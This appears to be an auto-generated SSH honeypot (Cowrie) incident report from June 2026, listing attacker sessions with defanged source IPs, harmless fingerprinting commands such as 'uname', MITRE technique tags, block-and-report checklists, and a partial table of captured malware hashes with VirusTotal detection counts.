| **Last Seen** | 2026-06-25 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:41:20` | `cowrie.session.connect` |
| `2026-06-25 20:41:20` | `cowrie.client.version` |
| `2026-06-25 20:41:20` | `cowrie.client.kex` |
| `2026-06-25 20:41:21` | `cowrie.login.success` |
| `2026-06-25 20:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d54de40defe

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 20:41 |
| **Last Seen** | 2026-06-25 20:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:41:22` | `cowrie.session.connect` |
| `2026-06-25 20:41:22` | `cowrie.client.version` |
| `2026-06-25 20:41:22` | `cowrie.client.kex` |
| `2026-06-25 20:41:23` | `cowrie.login.success` |
| `2026-06-25 20:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2376912cf3c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 20:41 |
| **Last Seen** | 2026-06-25 20:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:41:22` | `cowrie.session.connect` |
| `2026-06-25 20:41:22` | `cowrie.client.version` |
| `2026-06-25 20:41:22` | `cowrie.client.kex` |
| `2026-06-25 20:41:23` | `cowrie.login.success` |
| `2026-06-25 20:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4599d946e109

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:42 |
| **Last Seen** | 2026-06-25 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:42:02` | `cowrie.session.connect` |
| `2026-06-25 20:42:02` | `cowrie.client.version` |
| `2026-06-25 20:42:03` | `cowrie.client.kex` |
| `2026-06-25 20:42:03` | `cowrie.login.success` |
| `2026-06-25 20:42:04` | `cowrie.session.params` |
| `2026-06-25 20:42:04` | `cowrie.command.input` |
| `2026-06-25 20:42:04` | `cowrie.log.closed` |
| `2026-06-25 20:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb0ecc242de

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:42 |
| **Last Seen** | 2026-06-25 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:42:56` | `cowrie.session.connect` |
| `2026-06-25 20:42:56` | `cowrie.client.version` |
| `2026-06-25 20:42:56` | `cowrie.client.kex` |
| `2026-06-25 20:42:56` | `cowrie.login.success` |
| `2026-06-25 20:42:57` | `cowrie.session.params` |
| `2026-06-25 20:42:57` | `cowrie.command.input` |
| `2026-06-25 20:42:57` | `cowrie.log.closed` |
| `2026-06-25 20:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dbb1919dc1d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:43 |
| **Last Seen** | 2026-06-25 20:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:43:45` | `cowrie.session.connect` |
| `2026-06-25 20:43:45` | `cowrie.client.version` |
| `2026-06-25 20:43:45` | `cowrie.client.kex` |
| `2026-06-25 20:43:46` | `cowrie.login.success` |
| `2026-06-25 20:43:46` | `cowrie.session.params` |
| `2026-06-25 20:43:46` | `cowrie.command.input` |
| `2026-06-25 20:43:46` | `cowrie.log.closed` |
| `2026-06-25 20:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26885d8f199e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:44 |
| **Last Seen** | 2026-06-25 20:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:44:35` | `cowrie.session.connect` |
| `2026-06-25 20:44:35` | `cowrie.client.version` |
| `2026-06-25 20:44:35` | `cowrie.client.kex` |
| `2026-06-25 20:44:36` | `cowrie.login.success` |
| `2026-06-25 20:44:37` | `cowrie.session.params` |
| `2026-06-25 20:44:37` | `cowrie.command.input` |
| `2026-06-25 20:44:37` | `cowrie.log.closed` |
| `2026-06-25 20:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28846b0baf18

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:45 |
| **Last Seen** | 2026-06-25 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:45:25` | `cowrie.session.connect` |
| `2026-06-25 20:45:25` | `cowrie.client.version` |
| `2026-06-25 20:45:25` | `cowrie.client.kex` |
| `2026-06-25 20:45:25` | `cowrie.login.success` |
| `2026-06-25 20:45:26` | `cowrie.session.params` |
| `2026-06-25 20:45:26` | `cowrie.command.input` |
| `2026-06-25 20:45:26` | `cowrie.log.closed` |
| `2026-06-25 20:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5e34033142

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:46 |
| **Last Seen** | 2026-06-25 20:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:46:16` | `cowrie.session.connect` |
| `2026-06-25 20:46:16` | `cowrie.client.version` |
| `2026-06-25 20:46:16` | `cowrie.client.kex` |
| `2026-06-25 20:46:16` | `cowrie.login.success` |
| `2026-06-25 20:46:17` | `cowrie.session.params` |
| `2026-06-25 20:46:17` | `cowrie.command.input` |
| `2026-06-25 20:46:17` | `cowrie.log.closed` |
| `2026-06-25 20:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acaff6971504

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:47 |
| **Last Seen** | 2026-06-25 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:47:07` | `cowrie.session.connect` |
| `2026-06-25 20:47:07` | `cowrie.client.version` |
| `2026-06-25 20:47:08` | `cowrie.client.kex` |
| `2026-06-25 20:47:08` | `cowrie.login.success` |
| `2026-06-25 20:47:09` | `cowrie.session.params` |
| `2026-06-25 20:47:09` | `cowrie.command.input` |
| `2026-06-25 20:47:09` | `cowrie.log.closed` |
| `2026-06-25 20:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cca33bce6552

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 20:47 |
| **Last Seen** | 2026-06-25 20:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:47:15` | `cowrie.session.connect` |
| `2026-06-25 20:47:15` | `cowrie.client.version` |
| `2026-06-25 20:47:15` | `cowrie.client.kex` |
| `2026-06-25 20:47:17` | `cowrie.login.success` |
| `2026-06-25 20:47:19` | `cowrie.session.params` |
| `2026-06-25 20:47:19` | `cowrie.command.input` |
| `2026-06-25 20:47:19` | `cowrie.log.closed` |
| `2026-06-25 20:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4712bf194a83

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:48 |
| **Last Seen** | 2026-06-25 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:48:00` | `cowrie.session.connect` |
| `2026-06-25 20:48:00` | `cowrie.client.version` |
| `2026-06-25 20:48:00` | `cowrie.client.kex` |
| `2026-06-25 20:48:00` | `cowrie.login.success` |
| `2026-06-25 20:48:01` | `cowrie.session.params` |
| `2026-06-25 20:48:01` | `cowrie.command.input` |
| `2026-06-25 20:48:01` | `cowrie.log.closed` |
| `2026-06-25 20:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9a7fb19e44

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:48 |
| **Last Seen** | 2026-06-25 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:48:54` | `cowrie.session.connect` |
| `2026-06-25 20:48:54` | `cowrie.client.version` |
| `2026-06-25 20:48:54` | `cowrie.client.kex` |
| `2026-06-25 20:48:54` | `cowrie.login.success` |
| `2026-06-25 20:48:55` | `cowrie.session.params` |
| `2026-06-25 20:48:55` | `cowrie.command.input` |
| `2026-06-25 20:48:55` | `cowrie.log.closed` |
| `2026-06-25 20:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afbc2c9138e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:49 |
| **Last Seen** | 2026-06-25 20:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:49:46` | `cowrie.session.connect` |
| `2026-06-25 20:49:46` | `cowrie.client.version` |
| `2026-06-25 20:49:46` | `cowrie.client.kex` |
| `2026-06-25 20:49:46` | `cowrie.login.success` |
| `2026-06-25 20:49:47` | `cowrie.session.params` |
| `2026-06-25 20:49:47` | `cowrie.command.input` |
| `2026-06-25 20:49:47` | `cowrie.log.closed` |
| `2026-06-25 20:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5fb0f0c589

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:50 |
| **Last Seen** | 2026-06-25 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:50:38` | `cowrie.session.connect` |
| `2026-06-25 20:50:38` | `cowrie.client.version` |
| `2026-06-25 20:50:39` | `cowrie.client.kex` |
| `2026-06-25 20:50:39` | `cowrie.login.success` |
| `2026-06-25 20:50:40` | `cowrie.session.params` |
| `2026-06-25 20:50:40` | `cowrie.command.input` |
| `2026-06-25 20:50:40` | `cowrie.log.closed` |
| `2026-06-25 20:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f65ddae8a72e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:51 |
| **Last Seen** | 2026-06-25 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:51:30` | `cowrie.session.connect` |
| `2026-06-25 20:51:30` | `cowrie.client.version` |
| `2026-06-25 20:51:30` | `cowrie.client.kex` |
| `2026-06-25 20:51:30` | `cowrie.login.success` |
| `2026-06-25 20:51:31` | `cowrie.session.params` |
| `2026-06-25 20:51:31` | `cowrie.command.input` |
| `2026-06-25 20:51:31` | `cowrie.log.closed` |
| `2026-06-25 20:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2ff9619d4c0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 20:52 |
| **Last Seen** | 2026-06-25 20:52 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:52:03` | `cowrie.session.connect` |
| `2026-06-25 20:52:05` | `cowrie.client.version` |
| `2026-06-25 20:52:05` | `cowrie.client.kex` |
| `2026-06-25 20:52:10` | `cowrie.login.success` |
| `2026-06-25 20:52:15` | `cowrie.session.params` |
| `2026-06-25 20:52:15` | `cowrie.command.input` |
| `2026-06-25 20:52:16` | `cowrie.log.closed` |
| `2026-06-25 20:52:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71725354791f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:52 |
| **Last Seen** | 2026-06-25 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:52:22` | `cowrie.session.connect` |
| `2026-06-25 20:52:22` | `cowrie.client.version` |
| `2026-06-25 20:52:22` | `cowrie.client.kex` |
| `2026-06-25 20:52:22` | `cowrie.login.success` |
| `2026-06-25 20:52:23` | `cowrie.session.params` |
| `2026-06-25 20:52:23` | `cowrie.command.input` |
| `2026-06-25 20:52:23` | `cowrie.log.closed` |
| `2026-06-25 20:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f0412d9ab42

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:53 |
| **Last Seen** | 2026-06-25 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:53:15` | `cowrie.session.connect` |
| `2026-06-25 20:53:15` | `cowrie.client.version` |
| `2026-06-25 20:53:15` | `cowrie.client.kex` |
| `2026-06-25 20:53:15` | `cowrie.login.success` |
| `2026-06-25 20:53:16` | `cowrie.session.params` |
| `2026-06-25 20:53:16` | `cowrie.command.input` |
| `2026-06-25 20:53:16` | `cowrie.log.closed` |
| `2026-06-25 20:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71105b7345a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:54 |
| **Last Seen** | 2026-06-25 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:54:07` | `cowrie.session.connect` |
| `2026-06-25 20:54:07` | `cowrie.client.version` |
| `2026-06-25 20:54:07` | `cowrie.client.kex` |
| `2026-06-25 20:54:07` | `cowrie.login.success` |
| `2026-06-25 20:54:08` | `cowrie.session.params` |
| `2026-06-25 20:54:08` | `cowrie.command.input` |
| `2026-06-25 20:54:08` | `cowrie.log.closed` |
| `2026-06-25 20:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-626867565923

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 20:55 |
| **Last Seen** | 2026-06-25 20:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 20:55:00` | `cowrie.session.connect` |
| `2026-06-25 20:55:00` | `cowrie.client.version` |
| `2026-06-25 20:55:00` | `cowrie.client.kex` |
| `2026-06-25 20:55:01` | `cowrie.login.success` |
| `2026-06-25 20:55:01` | `cowrie.session.params` |
| `2026-06-25 20:55:01` | `cowrie.command.input` |
| `2026-06-25 20:55:01` | `cowrie.log.closed` |
| `2026-06-25 20:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `209.99.185[.]59` | **275** | 2026-06-25 16:55 | 2026-06-25 20:55 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `159.65.233[.]253` | **7** | 2026-06-25 18:36 | 2026-06-25 20:26 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **4** | 2026-06-25 17:00 | 2026-06-25 20:52 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `20.65.152[.]136` | **2** | 2026-06-25 20:52 | 2026-06-25 20:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | **2** | 2026-06-25 19:28 | 2026-06-25 20:53 | 1m | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]121` | **2** | 2026-06-25 20:05 | 2026-06-25 20:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.64.134[.]75` | **2** | 2026-06-25 20:24 | 2026-06-25 20:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]124` | **2** | 2026-06-25 19:39 | 2026-06-25 19:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.177[.]102` | 1 | 2026-06-25 17:38 | 2026-06-25 17:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-06-25 18:40 | 2026-06-25 18:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-06-25 19:46 | 2026-06-25 19:47 | 40s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]79` | 1 | 2026-06-25 16:59 | 2026-06-25 16:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `219.85.82[.]211` | 1 | 2026-06-25 17:52 | 2026-06-25 17:52 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-06-25 19:03 | 2026-06-25 19:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-06-25 19:47 | 2026-06-25 19:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-06-25 20:53 | 2026-06-25 20:53 | 3s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-06-25 19:50 | 2026-06-25 19:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]123` | 1 | 2026-06-25 19:40 | 2026-06-25 19:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]255` | 1 | 2026-06-25 19:39 | 2026-06-25 19:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]75` | 1 | 2026-06-25 19:42 | 2026-06-25 19:42 | 4s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]13` | 1 | 2026-06-25 17:53 | 2026-06-25 17:53 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 61/100 | 🟡 MEDIUM | **3/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 45/100 | 🟡 MEDIUM | **13/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 40/100 | 🟡 MEDIUM | **1/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 44/100 | 🟡 MEDIUM | **11/75** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 46/100 | 🟡 MEDIUM | **15/75** 🔴 |
